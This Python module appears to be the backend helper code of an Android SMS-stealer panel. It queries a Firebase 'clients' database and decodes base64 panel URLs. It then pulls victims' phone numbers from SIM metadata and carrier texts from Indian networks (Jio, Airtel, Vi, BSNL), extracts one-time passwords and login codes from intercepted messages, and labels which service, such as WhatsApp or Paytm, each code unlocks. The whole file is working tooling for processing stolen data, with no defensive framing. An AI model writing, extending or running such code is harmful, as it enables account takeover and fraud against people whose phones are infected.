import aiohttp, json, re, base64, time
from collections import Counter

async def fetch_fb(url, auth=None):
    full_url = url
    if auth and str(auth).strip() and str(auth) != "None":
        full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(full_url, timeout=4) as resp: # Fast Timeout
                if resp.status == 200:
                    txt = await resp.text()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception: pass
    return None

async def check_ping(url, auth=None):
    start = time.time()
    full_url = url
    if auth and str(auth).strip() and str(auth) != "None":
        full_url += f"&auth={auth}" if "?" in full_url else f"?auth={auth}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"{full_url}/clients.json?shallow=true", timeout=3) as resp:
                if resp.status == 200: return f"{int((time.time() - start) * 1000)}ms"
    except Exception: pass
    return "❌ Timeout"

def decode_panel_url(panel_url):
    match = re.search(r'([A-Za-z0-9+/=]{20,})', panel_url)
    if not match: return None
    b64_str = match.group(1)
    try:
        b64_str += "=" * ((4 - len(b64_str) % 4) % 4)
        decoded = base64.b64decode(b64_str).decode('utf-8')
        if "|||" in decoded: return decoded.split("|||")[0], ""
        try:
            data = json.loads(decoded)
            if isinstance(data, dict) and "url" in data: return data["url"], data.get("key", "")
        except json.JSONDecodeError:
            if decoded.startswith("http"): return decoded, ""
    except Exception: pass
    return None

def extract_best_numbers(dev_data, msgs):
    found_nums = {}
    bad_numbers = {"9264092640", "18001800", "919951860002", "18001035577", "1234567890", "0000000000"}

    # 1. Check exact SIM / Phone metadata fields (100% Confirm)
    for key in ["phoneNumber", "phone", "number", "mobile", "simSerialNumber"]:
        if dev_data.get(key):
            n = re.sub(r'\D', '', str(dev_data[key]))[-10:]
            if len(n) == 10 and n[0] in "6789" and n not in bad_numbers:
                found_nums[n] = 100
                
    # Check SIM slots if available
    if isinstance(dev_data.get("sims"), list):
        for sim in dev_data["sims"]:
            if isinstance(sim, dict):
                for key in ["phoneNumber", "number"]:
                    if sim.get(key):
                        n = re.sub(r'\D', '', str(sim[key]))[-10:]
                        if len(n) == 10 and n[0] in "6789" and n not in bad_numbers:
                            found_nums[n] = 100

    # 2. Strict Carrier Regex (Jio Number 9238576124)
    for m in msgs:
        text = m.get("message", "")
        sender = str(m.get("sender", "")).lower()
        
        # Check if message is from carrier or mentions carrier number
        if any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]) or any(c in text.lower() for c in ["jio number", "airtel number"]):
            # Look for patterns like "Jio Number 9238576124" or "on Jio Number 9238576124"
            carrier_match = re.search(r'(?:jio|airtel|vi|bsnl)\s+number\s+([6-9]\d{9})', text, re.IGNORECASE)
            if carrier_match:
                n = carrier_match.group(1)
                if n not in bad_numbers:
                    found_nums[n] = 100
                    continue
                    
            # General fallback for carrier messages (if it's a direct notification)
            if "your jio number" in text.lower() or "your airtel number" in text.lower():
                match = re.search(r'\b([6-9]\d{9})\b', text)
                if match and match.group(1) not in bad_numbers:
                    found_nums[match.group(1)] = 100

    # 3. General Message Regex (Frequent numbers)
    all_msg_text = " ".join([m.get("message", "") for m in msgs])
    msg_matches = re.findall(r'(?:\+?91[\-\s]?)?([6-9]\d{9})\b', all_msg_text)
    
    for num in set(msg_matches):
        if num in bad_numbers or num in found_nums: continue
        
        score = 40
        is_carrier = False
        
        # Check if this number was sent by a carrier
        for m in msgs:
            sender = str(m.get("sender", "")).lower()
            if num in m.get("message", "") and any(c in sender for c in ["jio", "airtel", "vi", "bsnl"]):
                is_carrier = True
                break
                
        if is_carrier: score = 100
        else: 
            count = msg_matches.count(num)
            score = min(score + (count * 10), 95)
            
        if num not in found_nums or score > found_nums[num]:
            found_nums[num] = score

    sorted_nums = sorted(found_nums.items(), key=lambda x: x[1], reverse=True)[:2]
    return sorted_nums

def extract_otp(text):
    if not any(k in text.lower() for k in ["otp", "code", "verification", "login", "pin", "password", "sign-in"]): return None
    match = re.search(r'\b(\d{4,8})\b', text)
    return match.group(1) if match else None

def extract_service_name(text, sender):
    text_lower = text.lower()
    services = {"whatsapp": "WhatsApp", "facebook": "Facebook", "instagram": "Instagram", "telegram": "Telegram", "amazon": "Amazon", "flipkart": "Flipkart", "swiggy": "Swiggy", "zomato": "Zomato", "paytm": "Paytm", "jio": "Jio", "airtel": "Airtel", "meesho": "Meesho"}
    for key, name in services.items():
        if key in text_lower: return name
    if sender and "-" in sender: return sender.split("-")[1]
    return "Unknown"
